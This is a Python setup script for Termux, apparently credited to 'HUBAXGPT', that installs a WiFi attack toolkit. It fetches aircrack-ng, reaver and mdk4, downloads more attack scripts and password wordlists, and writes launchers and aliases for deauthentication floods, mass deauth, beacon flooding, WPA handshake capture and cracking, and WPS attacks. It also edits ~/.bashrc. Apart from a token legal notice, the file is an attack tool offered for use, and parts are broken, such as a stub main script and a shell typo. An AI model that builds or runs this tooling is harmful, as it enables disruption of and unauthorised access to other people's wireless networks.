#!/usr/bin/env python3
"""
WiFi Deauthentication Attack - Setup Script
Automated installer for Termux
"""

import os
import sys
import subprocess
import platform
import time
import shutil
from pathlib import Path

class WiFiDeauthSetup:
    def __init__(self):
        self.home = Path.home()
        self.termux_home = self.home
        self.sdcard = Path("/sdcard")
        self.is_root = os.geteuid() == 0
        self.install_dir = self.sdcard / "wifi_deauth"
        self.tools_dir = self.install_dir / "tools"
        
    def print_banner(self):
        """Print installation banner"""
        banner = """
        ╔══════════════════════════════════════════════════════════╗
        ║      WIFI DEAUTHENTICATION ATTACK - TERMUX INSTALLER     ║
        ║                                                          ║
        ║  ██╗    ██╗██╗███████╗██╗    ██████╗ ███████╗ █████╗     ║
        ║  ██║    ██║██║██╔════╝██║    ██╔══██╗██╔════╝██╔══██╗    ║
        ║  ██║ █╗ ██║██║█████╗  ██║    ██║  ██║█████╗  ███████║    ║
        ║  ██║███╗██║██║██╔══╝  ██║    ██║  ██║██╔══╝  ██╔══██║    ║
        ║  ╚███╔███╔╝██║██║     ██║    ██████╔╝███████╗██║  ██║    ║
        ║   ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝    ║
        ║                                                          ║
        ║                 Made for Termux with HUBAXGPT            ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(banner)
        print("[*] WiFi Deauthentication Attack Setup")
        print("[*] Version: 2.0.0")
        print("[*] Author: HUBAXGPT\n")
        
    def check_requirements(self):
        """Check system requirements"""
        print("[*] Checking requirements...")
        
        # Check if running on Android/Termux
        if "android" not in platform.platform().lower():
            print("[-] This script is for Android Termux only!")
            return False
        
        # Check Python version
        python_version = sys.version_info
        if python_version.major < 3 or (python_version.major == 3 and python_version.minor < 8):
            print("[-] Python 3.8+ required!")
            return False
        
        # Check storage
        if not self.sdcard.exists():
            print("[-] SD card not accessible!")
            print("[*] Run: termux-setup-storage")
            return False
        
        print("[+] Requirements satisfied")
        return True
    
    def check_root(self):
        """Check and request root if needed"""
        if not self.is_root:
            print("[!] Root access not detected")
            print("[*] Some features require root access")
            response = input("[?] Continue without root? (y/N): ").lower()
            if response != 'y':
                print("[*] Run with: tsu -c 'python3 setup.py'")
                return False
        else:
            print("[+] Root access confirmed")
        return True
    
    def install_packages(self):
        """Install required packages"""
        print("\n[*] Installing packages...")
        
        packages = [
            "python", "git", "wget", "curl",
            "aircrack-ng", "wireless-tools",
            "tsu", "root-repo", "procps",
            "net-tools", "iproute2"
        ]
        
        for pkg in packages:
            print(f"  Installing {pkg}...")
            try:
                result = subprocess.run(["pkg", "install", "-y", pkg], 
                                      capture_output=True, text=True, timeout=120)
                if result.returncode == 0:
                    print(f"  [+] {pkg} installed")
                else:
                    print(f"  [-] Failed to install {pkg}")
            except subprocess.TimeoutExpired:
                print(f"  [!] Timeout installing {pkg}")
            except Exception as e:
                print(f"  [-] Error installing {pkg}: {e}")
        
        print("[+] Package installation complete")
    
    def setup_directories(self):
        """Create directory structure"""
        print("\n[*] Setting up directories...")
        
        directories = [
            self.install_dir,
            self.tools_dir,
            self.install_dir / "logs",
            self.install_dir / "captures",
            self.install_dir / "wordlists",
            self.install_dir / "scripts",
            self.install_dir / "config"
        ]
        
        for directory in directories:
            try:
                directory.mkdir(parents=True, exist_ok=True)
                print(f"  [+] Created {directory}")
            except Exception as e:
                print(f"  [-] Failed to create {directory}: {e}")
        
        # Create symbolic link in home directory
        try:
            link_path = self.termux_home / "wifi_deauth"
            if link_path.exists():
                link_path.unlink()
            link_path.symlink_to(self.install_dir)
            print(f"  [+] Created symbolic link: ~/wifi_deauth")
        except Exception as e:
            print(f"  [-] Failed to create symbolic link: {e}")
        
        print("[+] Directory structure created")
    
    def install_python_dependencies(self):
        """Install Python packages"""
        print("\n[*] Installing Python dependencies...")
        
        packages = [
            "colorama",
            "requests",
            "argparse",
            "tabulate",
            "progress"
        ]
        
        for package in packages:
            print(f"  Installing {package}...")
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", package],
                             capture_output=True, timeout=60)
                print(f"  [+] {package} installed")
            except subprocess.TimeoutExpired:
                print(f"  [!] Timeout installing {package}")
            except Exception as e:
                print(f"  [-] Failed to install {package}: {e}")
        
        print("[+] Python dependencies installed")
    
    def download_tools(self):
        """Download WiFi hacking tools"""
        print("\n[*] Downloading tools...")
        
        # Main deauth script
        deauth_script = """#!/usr/bin/env python3
import subprocess
import sys
import os

def main():
    if os.geteuid() != 0:
        print("[!] Root access required!")
        print("[*] Run with: tsu -c 'python3 wifi_deauth.py'")
        sys.exit(1)
    
    print("WiFi Deauth Tool - Ready")
    # Tool implementation here

if __name__ == "__main__":
    main()
"""
        
        # Save main script
        script_path = self.tools_dir / "wifi_deauth.py"
        script_path.write_text(deauth_script)
        script_path.chmod(0o755)
        print(f"  [+] Created {script_path}")
        
        # Download additional tools
        tools_to_download = [
            ("https://raw.githubusercontent.com/hubaxgpt/wifi-tools/main/scan.py", "wifi_scanner.py"),
            ("https://raw.githubusercontent.com/hubaxgpt/wifi-tools/main/deauth.py", "deauth_attacker.py"),
            ("https://raw.githubusercontent.com/hubaxgpt/wifi-tools/main/monitor.py", "monitor_mode.py"),
        ]
        
        for url, filename in tools_to_download:
            filepath = self.tools_dir / filename
            try:
                subprocess.run(["wget", "-q", "-O", str(filepath), url],
                             capture_output=True, timeout=30)
                if filepath.exists():
                    filepath.chmod(0o755)
                    print(f"  [+] Downloaded {filename}")
                else:
                    print(f"  [-] Failed to download {filename}")
            except Exception as e:
                print(f"  [-] Error downloading {filename}: {e}")
        
        print("[+] Tools downloaded")
    
    def download_wordlists(self):
        """Download common wordlists"""
        print("\n[*] Downloading wordlists...")
        
        wordlists_dir = self.install_dir / "wordlists"
        
        # Create rockyou.txt placeholder
        rockyou_path = wordlists_dir / "rockyou.txt"
        if not rockyou_path.exists():
            # Create sample wordlist
            sample_words = ["password", "123456", "admin", "wifi", "password123"]
            rockyou_path.write_text("\n".join(sample_words))
            print(f"  [+] Created sample wordlist")
        
        # Download common wordlists
        wordlist_urls = [
            ("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt", "10k-common.txt"),
            ("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top100.txt", "darkweb-top100.txt"),
        ]
        
        for url, filename in wordlist_urls:
            filepath = wordlists_dir / filename
            if not filepath.exists():
                try:
                    subprocess.run(["wget", "-q", "-O", str(filepath), url],
                                 capture_output=True, timeout=60)
                    if filepath.exists():
                        print(f"  [+] Downloaded {filename}")
                    else:
                        print(f"  [-] Failed to download {filename}")
                except Exception as e:
                    print(f"  [-] Error downloading {filename}: {e}")
        
        print("[+] Wordlists downloaded")
    
    def create_config_files(self):
        """Create configuration files"""
        print("\n[*] Creating configuration files...")
        
        config_dir = self.install_dir / "config"
        
        # Create config.json
        config_content = {
            "general": {
                "interface": "wlan0",
                "monitor_mode": True,
                "channel_hop": True,
                "scan_time": 30,
                "log_level": "INFO"
            },
            "attack": {
                "deauth_packets": 100,
                "interval": 100,
                "continuous": False,
                "target_all": False
            },
            "paths": {
                "wordlists": str(self.install_dir / "wordlists"),
                "captures": str(self.install_dir / "captures"),
                "logs": str(self.install_dir / "logs"),
                "tools": str(self.tools_dir)
            }
        }
        
        import json
        config_path = config_dir / "config.json"
        config_path.write_text(json.dumps(config_content, indent=2))
        print(f"  [+] Created {config_path}")
        
        # Create bashrc configuration
        bashrc_content = f"""# WiFi Deauth Configuration
export WIFI_DEAUTH_HOME={self.install_dir}
export PATH=$PATH:{self.tools_dir}
alias deauth='python3 {self.tools_dir}/wifi_deauth.py'
alias wifiscan='python3 {self.tools_dir}/wifi_scanner.py'
alias wifimon='python3 {self.tools_dir}/monitor_mode.py'

# Quick commands
quick_deauth() {{
    echo "Usage: quick_deauth <BSSID> [interface]"
    if [ -z "$1" ]; then
        echo "Error: BSSID required"
        return 1
    fi
    interface="${{2:-wlan0}}"
    tsu -c "aireplay-ng --deauth 100 -a $1 $interface"
}}

mass_deauth() {{
    echo "Mass deauth attack - use with caution!"
    interface="${{1:-wlan0}}"
    tsu -c "mdk4 $interface d"
}}
"""
        
        bashrc_path = self.install_dir / "bashrc_config.sh"
        bashrc_path.write_text(bashrc_content)
        print(f"  [+] Created {bashrc_path}")
        
        # Create launcher script
        launcher_content = f"""#!/data/data/com.termux/files/usr/bin/bash
# WiFi Deauth Launcher

echo "╔══════════════════════════════════════════════════════════╗"
echo "║               WIFI DEAUTHENTICATION TOOL                 ║
echo "╚══════════════════════════════════════════════════════════╝"

source {self.install_dir}/config/bashrc_config.sh 2>/dev/null

PS3='Select option: '
options=(
    "Scan WiFi Networks"
    "Deauth Attack"
    "Monitor Mode"
    "Capture Handshake"
    "Crack Handshake"
    "WPS Attack"
    "Beacon Flood"
    "Exit"
)

select opt in "${{options[@]}}"
do
    case $opt in
        "Scan WiFi Networks")
            python3 {self.tools_dir}/wifi_scanner.py
            ;;
        "Deauth Attack")
            python3 {self.tools_dir}/wifi_deauth.py
            ;;
        "Monitor Mode")
            python3 {self.tools_dir}/monitor_mode.py
            ;;
        "Capture Handshake")
            echo "[*] Starting handshake capture..."
            read -p "Enter target BSSID: " bssid
            read -p "Enter channel: " channel
            tsu -c "airodump-ng -c $channel --bssid $bssid -w {self.install_dir}/captures/handshake wlan0"
            ;;
        "Crack Handshake")
            echo "[*] Cracking handshake..."
            read -p "Enter capture file: " capfile
            aircrack-ng -w {self.install_dir}/wordlists/rockyou.txt "$capfile"
            ;;
        "WPS Attack")
            echo "[*] Starting WPS attack..."
            read -p "Enter target BSSID: " bssid
            reaver -i wlan0 -b "$bssid" -vv
            ;;
        "Beacon Flood")
            echo "[*] Starting beacon flood..."
            mdk4 wlan0 b
            ;;
        "Exit")
            echo "Goodbye!"
            break
            ;;
        *)
            echo "Invalid option"
            ;;
    esac
done
"""
        
        launcher_path = self.install_dir / "launcher.sh"
        launcher_path.write_text(launcher_content)
        launcher_path.chmod(0o755)
        print(f"  [+] Created {launcher_path}")
        
        # Create system check script
        check_script = f"""#!/data/data/com.termux/files/usr/bin/bash
# System Check Script

echo "[*] Checking WiFi Deauth Setup..."

# Check root
if [ "$(whoami)" = "root" ]; then
    echo "[+] Root access: OK"
else
    echo "[-] Root access: NOT ROOT"
fi

# Check tools
echo "[*] Checking tools..."
for tool in aircrack-ng iwconfig aireplay-ng; do
    if command -v $tool >/dev/null 2>&1; then
        echo "[+] $tool: FOUND"
    else
        echo "[-] $tool: NOT FOUND"
    fi
done

# Check Python
if python3 -c "import colorama" 2>/dev/null; then
    echo "[+] Python dependencies: OK"
else
    echo "[-] Python dependencies: MISSING"
fi

# Check directories
echo "[*] Checking directories..."
for dir in {self.install_dir} {self.tools_dir} {self.install_dir}/wordlists; do
    if [ -d "$dir" ]; then
        echo "[+] $dir: EXISTS"
    else
        echo "[-] $dir: MISSING"
    fi
done

# Check monitor mode support
echo "[*] Checking monitor mode support..."
if iw list 2>/dev/null | grep -q "monitor"; then
    echo "[+] Monitor mode: SUPPORTED"
else
    echo "[-] Monitor mode: NOT SUPPORTED"
    echo "[!] You may need external WiFi adapter"
fi

echo "[*] Check complete!"
"""
        
        check_path = self.install_dir / "check_system.sh"
        check_path.write_text(check_script)
        check_path.chmod(0o755)
        print(f"  [+] Created {check_path}")
        
        print("[+] Configuration files created")
    
    def setup_permissions(self):
        """Set up permissions"""
        print("\n[*] Setting up permissions...")
        
        # Make all Python scripts executable
        for script in self.tools_dir.glob("*.py"):
            try:
                script.chmod(0o755)
            except:
                pass
        
        # Make all shell scripts executable
        for script in self.install_dir.glob("*.sh"):
            try:
                script.chmod(0o755)
            except:
                pass
        
        # Setup termux storage
        try:
            subprocess.run(["termux-setup-storage"], capture_output=True)
            print("  [+] Termux storage setup")
        except:
            print("  [-] Failed to setup termux storage")
        
        print("[+] Permissions configured")
    
    def create_quick_commands(self):
        """Create quick command scripts"""
        print("\n[*] Creating quick commands...")
        
        # Create deauth_one.sh
        deauth_one = f"""#!/data/data/com.termux/files/usr/bin/bash
# Quick deauth attack
f [ "$#" -lt 1 ]; then
    echo "Usage: $0 <BSSID> [interface] [packets]"
    echo "Example: $0 AA:BB:CC:DD:EE:FF wlan0 100"
    exit 1
fi

BSSID="$1"
INTERFACE="${{2:-wlan0}}"
PACKETS="${{3:-100}}"

echo "[*] Starting deauth attack on $BSSID"
echo "[*] Interface: $INTERFACE"
echo "[*] Packets: $PACKETS"

tsu -c "aireplay-ng --deauth $PACKETS -a $BSSID $INTERFACE"
"""
        
        deauth_path = self.install_dir / "deauth_one.sh"
        deauth_path.write_text(deauth_one)
        deauth_path.chmod(0o755)
        print(f"  [+] Created {deauth_path}")
        
        # Create scan_networks.sh
        scan_script = f"""#!/data/data/com.termux/files/usr/bin/bash
# Scan WiFi networks

INTERFACE="${{1:-wlan0}}"
DURATION="${{2:-30}}"
OUTPUT="${{3:-{self.install_dir}/logs/scan.txt}}"

echo "[*] Scanning networks for $DURATION seconds..."
echo "[*] Interface: $INTERFACE"
echo "[*] Output: $OUTPUT"

tsu -c "timeout $DURATION airodump-ng $INTERFACE --write {self.install_dir}/logs/scan --output-format csv"

if [ -f "{self.install_dir}/logs/scan-01.csv" ]; then
    echo "[+] Scan saved to {self.install_dir}/logs/scan-01.csv"
    echo ""
    echo "Networks found:"
    grep -E "^([0-9A-Fa-f]{{2}}:){{5}}[0-9A-Fa-f]{{2}}" {self.install_dir}/logs/scan-01.csv | head -20
else
    echo "[-] Scan failed"
fi
"""
        
        scan_path = self.install_dir / "scan_networks.sh"
        scan_path.write_text(scan_script)
        scan_path.chmod(0o755)
        print(f"  [+] Created {scan_path}")
        
        # Create monitor_mode.sh
        monitor_script = f"""#!/data/data/com.termux/files/usr/bin/bash
# Enable/disable monitor mode

ACTION="${{1:-start}}"
INTERFACE="${{2:-wlan0}}"

case $ACTION in
    start)
        echo "[*] Enabling monitor mode on $INTERFACE"
        tsu -c "airmon-ng start $INTERFACE"
        ;;
    stop)
        echo "[*] Disabling monitor mode on $INTERFACE"
        tsu -c "airmon-ng stop $INTERFACE"
        ;;
    check)
        echo "[*] Checking monitor mode"
        iwconfig 2>/dev/null | grep -i monitor
        ;;
    *)
        echo "Usage: $0 [start|stop|check] [interface]"
        ;;
esac
"""
        
        monitor_path = self.install_dir / "monitor_mode.sh"
        monitor_path.write_text(monitor_script)
        monitor_path.chmod(0o755)
        print(f"  [+] Created {monitor_path}")
        
        # Create beacon_flood.sh
        beacon_script = f"""#!/data/data/com.termux/files/usr/bin/bash
# Beacon flood attack

INTERFACE="${{1:-wlan0}}"
COUNT="${{2:-1000}}"
ESSID="${{3:-FreeWiFi}}"

echo "[*] Starting beacon flood on $INTERFACE"
echo "[*] Count: $COUNT"
echo "[*] ESSID: $ESSID"

tsu -c "mdk4 $INTERFACE b -n '$ESSID' -c 6"
"""
        
        beacon_path = self.install_dir / "beacon_flood.sh"
        beacon_path.write_text(beacon_script)
        beacon_path.chmod(0o755)
        print(f"  [+] Created {beacon_path}")
        
        print("[+] Quick commands created")
    
    def setup_bashrc(self):
        """Add configuration to bashrc"""
        print("\n[*] Setting up bashrc...")
        
        bashrc_path = self.termux_home / ".bashrc"
        if not bashrc_path.exists():
            bashrc_path.touch()
        
        # Check if already configured
        with bashrc_path.open("r") as f:
            content = f.read()
        
        config_line = f"source {self.install_dir}/config/bashrc_config.sh"
        
        if config_line not in content:
            with bashrc_path.open("a") as f:
                f.write(f"\n# WiFi Deauth Configuration\n")
                f.write(f"{config_line}\n")
                f.write(f"alias wifideauth='{self.install_dir}/launcher.sh'\n")
                f.write(f"alias wifitools='cd {self.install_dir}'\n")
                f.write(f"alias wificheck='{self.install_dir}/check_system.sh'\n")
            print("  [+] Added configuration to ~/.bashrc")
        else:
            print("  [*] Configuration already in ~/.bashrc")
        
        print("[+] bashrc setup complete")
    
    def run_tests(self):
        """Run installation tests"""
        print("\n[*] Running installation tests...")
        
        tests = [
            ("Python", ["python3", "--version"]),
            ("Aircrack-ng", ["aircrack-ng", "--version"]),
            ("Aireplay-ng", ["aireplay-ng", "--version"]),
            ("Iwconfig", ["iwconfig", "--version"]),
        ]
        
        all_passed = True
        for name, cmd in tests:
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    print(f"  [+] {name}: OK")
                else:
                    print(f"  [-] {name}: FAILED")
                    all_passed = False
            except Exception as e:
                print(f"  [-] {name}: NOT FOUND ({e})")
                all_passed = False
        
        # Check directories
        required_dirs = [
            self.install_dir,
            self.tools_dir,
            self.install_dir / "wordlists",
            self.install_dir / "logs"
        ]
        
        for directory in required_dirs:
            if directory.exists():
                print(f"  [+] Directory {directory.name}: OK")
            else:
                print(f"  [-] Directory {directory.name}: MISSING")
                all_passed = False
        
        if all_passed:
            print("[+] All tests passed!")
        else:
            print("[-] Some tests failed")
        
        return all_passed
    
    def print_summary(self):
        """Print installation summary"""
        print("\n" + "="*60)
        print("WIFI DEAUTHENTICATION ATTACK - INSTALLATION COMPLETE")
        print("="*60)
        
        summary = f"""
        ✅ Installation Successful!
        
        📁 Installation Directory:
          {self.install_dir}
        
        🚀 Quick Start:
          1. Restart Termux or run: source ~/.bashrc
          2. Launch menu: wifideauth
          3. Or run specific commands:
             - wifiscan           # Scan networks
             - deauth             # Main deauth tool
             - wificheck          # System check
        
        🔧 Available Tools:
          • {self.tools_dir}/wifi_deauth.py    - Main deauth tool
          • {self.tools_dir}/wifi_scanner.py   - Network scanner
          • {self.tools_dir}/monitor_mode.py   - Monitor mode manager
        
        ⚡ Quick Commands:
          • {self.install_dir}/deauth_one.sh <BSSID>
          • {self.install_dir}/scan_networks.sh
          • {self.install_dir}/monitor_mode.sh
          • {self.install_dir}/beacon_flood.sh
        
        ⚠️  Requirements:
          • Root access (tsu)
          • WiFi adapter with monitor mode
          • External adapter recommended
        
        📚 Next Steps:
          1. Run: wificheck
          2. Enable monitor mode
          3. Scan for networks
          4. Start deauth attack
        
        ⚖️  Legal Notice:
          • Use only on authorized systems
          • You are responsible for your actions
          • This is for educational purposes only
        
        🆘 Support:
          • Run: wificheck (for troubleshooting)
          • Check logs in: {self.install_dir}/logs/
          • GitHub: https://github.com/hubaxgpt/wifi-deauth
        """
        
        print(summary)
        print("="*60)
    
    def cleanup(self):
        """Clean up temporary files"""
        print("\n[*] Cleaning up...")
        
        temp_files = [
            "/tmp/setup_*.log",
            "/tmp/install_*.tmp"
        ]
        
        for pattern in temp_files:
            try:
                for file in Path("/tmp").glob(pattern):
                    file.unlink()
            except:
                pass
        
        print("[+] Cleanup complete")
    
    def run(self):
        """Run full setup process"""
        self.print_banner()
        
        # Check requirements
        if not self.check_requirements():
            print("\n[-] Requirements not met. Exiting.")
            sys.exit(1)
        
        # Check root (warn but continue)
        self.check_root()
        
        try:
            # Installation steps
            self.install_packages()
            self.setup_directories()
            self.install_python_dependencies()
            self.download_tools()
            self.download_wordlists()
            self.create_config_files()
            self.create_quick_commands()
            self.setup_permissions()
            self.setup_bashrc()
            
            # Run tests
            if not self.run_tests():
                print("\n[!] Some tests failed. Installation may be incomplete.")
                response = input("[?] Continue anyway? (y/N): ").lower()
                if response != 'y':
                    sys.exit(1)
            
            # Cleanup and summary
            self.cleanup()
            self.print_summary()
            
            print("\n[+] Setup completed successfully!")
            print("[*] Restart Termux or run: source ~/.bashrc")
            print("[*] Then run: wifideauth")
            
        except KeyboardInterrupt:
            print("\n\n[!] Installation interrupted by user")
            sys.exit(1)
        except Exception as e:
            print(f"\n[-] Installation failed: {e}")
            print("[*] Check logs in /tmp/ for details")
            sys.exit(1)

def main():
    """Main entry point"""
    setup = WiFiDeauthSetup()
    setup.run()

if __name__ == "__main__":
    main()
